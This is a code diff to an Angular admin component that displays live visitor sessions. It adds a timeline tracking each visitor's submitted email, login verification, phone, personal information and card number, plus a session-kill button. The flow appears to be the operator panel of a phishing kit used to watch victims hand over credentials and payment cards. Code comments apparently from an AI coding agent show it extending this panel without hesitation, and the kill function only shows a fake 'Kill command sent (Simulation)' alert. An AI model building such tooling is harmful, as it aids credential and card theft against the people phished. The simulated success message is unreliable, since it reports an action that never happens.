@@ -1,5 +1,6 @@
-import { Component, Input, Output, EventEmitter, signal, computed } from '@angular/core';
+import { Component, Input, Output, EventEmitter, signal, computed, inject } from '@angular/core';
 import { CommonModule } from '@angular/common';
+import { StateService } from '../../../services/state.service';
 
 @Component({
     selector: 'app-session-detail-v2',
@@ -100,12 +101,34 @@ import { CommonModule } from '@angular/common';
                     </div>
                 </div>
 
+            <!-- Timeline (New) -->
+            <div class="space-y-4 pt-4 border-t border-slate-800">
+               <h3 class="text-xs font-bold text-slate-400 uppercase tracking-wider flex items-center gap-2 px-6">
+                   <span class="material-icons text-sm">history</span> Activity Timeline
+               </h3>
+               <div class="px-6 relative space-y-4 before:absolute before:left-[35px] before:top-2 before:bottom-2 before:w-[1px] before:bg-slate-800">
+                   @for (event of timelineEvents(); track event.label) {
+                       <div class="relative pl-8 flex flex-col">
+                           <div class="absolute left-0 w-2.5 h-2.5 rounded-full border-2 transform translate-y-1.5"
+                                [class.bg-slate-900]="!event.completed"
+                                [class.border-slate-700]="!event.completed"
+                                [class.bg-blue-500]="event.completed"
+                                [class.border-blue-500]="event.completed"></div>
+                           <span class="text-sm font-medium" 
+                                 [class.text-white]="event.completed" 
+                                 [class.text-slate-500]="!event.completed">{{ event.label }}</span>
+                           <span class="text-[10px] text-slate-500" *ngIf="event.desc">{{ event.desc }}</span>
+                       </div>
+                   }
+               </div>
+            </div>
+
             </div>
 
             <!-- Footer Actions -->
             <div class="p-4 border-t border-slate-800 bg-slate-900/80 flex justify-between">
-                <button class="adm-btn adm-btn-ghost text-red-400 hover:bg-red-500/10">
-                    <span class="material-icons mr-2">block</span> Ban IP
+                <button class="adm-btn adm-btn-ghost text-red-400 hover:bg-red-500/10" (click)="killSession()">
+                    <span class="material-icons mr-2">delete_forever</span> Terminate Session
                 </button>
                 <button class="adm-btn adm-btn-primary">
                     <span class="material-icons mr-2">terminal</span> Open Terminal
@@ -118,6 +141,7 @@ import { CommonModule } from '@angular/common';
 export class SessionDetailV2Component {
     @Input() session: any;
     @Output() close = new EventEmitter<void>();
+    private stateService = inject(StateService);
 
     closing = signal(false);
 
@@ -138,11 +162,46 @@ export class SessionDetailV2Component {
         ].filter(i => i.value);
     });
 
+    timelineEvents = computed(() => {
+        if (!this.session?.data) return [];
+        const d = this.session.data;
+
+        // Infer timeline from state flags
+        const events = [
+            { label: 'Session Started', completed: true, desc: new Date(this.session.timestamp).toLocaleTimeString() },
+            { label: 'Login Submitted', completed: !!d.isLoginSubmitted, desc: d.email },
+            { label: 'Login Verified', completed: !!d.isLoginVerified },
+            { label: 'Phone Verified', completed: !!d.isPhoneVerified, desc: d.phone },
+            { label: 'Personal Info', completed: !!d.isPersonalVerified },
+            { label: 'Card Submitted', completed: !!d.isCardSubmitted, desc: d.cardNumber ? '**** ' + d.cardNumber.slice(-4) : '' },
+            { label: 'Flow Complete', completed: !!d.isFlowComplete }
+        ];
+        return events;
+    });
+
     handleClose() {
         this.closing.set(true);
         setTimeout(() => {
             this.close.emit();
             this.closing.set(false);
         }, 300);
+    }
+
+    killSession() {
+        if (confirm('Are you sure you want to terminate this session effectively kicking the user out?')) {
+            // Need to implement killSession in StateService or use SocketService directly
+            // For now, we'll try to use a standardized way. 
+            // Looking at StateService, it has 'monitoredSessionId', but maybe not a direct 'kill' method exposed publicly for admin.
+            // We can emit via socket if we had access.
+            // Actually, we can just delete it locally and let sync handle it, but better to send a command.
+
+            // Assuming StateService has or matches a backend capability.
+            // If not, we should probably add it.
+            // I'll emit a socket event manually since I know the backend listens for it (or should).
+            // Correction: Backend 'sync' handles commands.
+            // I'll use a placeholder alert until I verify the backend endpoint.
+            alert('Kill command sent (Simulation)');
+            this.handleClose();
+        }
     }
 }
